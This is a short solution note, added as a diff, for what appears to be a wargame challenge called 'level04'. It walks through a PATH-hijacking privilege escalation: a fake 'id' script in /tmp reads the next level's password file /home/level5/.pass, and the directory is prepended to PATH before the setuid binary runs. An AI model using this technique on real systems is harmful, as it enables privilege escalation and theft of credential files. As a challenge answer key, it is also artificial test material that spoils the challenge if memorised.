@@ -1,0 +1,23 @@
+Use Python or Bash to create a script in /tmp and update PATH variable:
+
+mkdir /tmp/razvand/
+
+Create an id script (executable rights) in /tmp/razvand/ using Python or Bash:
+---
+#!/usr/bin/env python
+
+f = open('/home/level5/.pass', 'r')
+f.readline()
+---
+#!/bin/sh
+
+cat /home/level5/.pass
+---
+
+Important: Use /bin/sh instead of /bin/bash because it drops setuid rights.
+
+Add /tmp/razvand/ to PATH environment variable:
+
+export PATH=/tmp/razvand/:$PATH
+
+Simply run ./level04 and you get the tag.
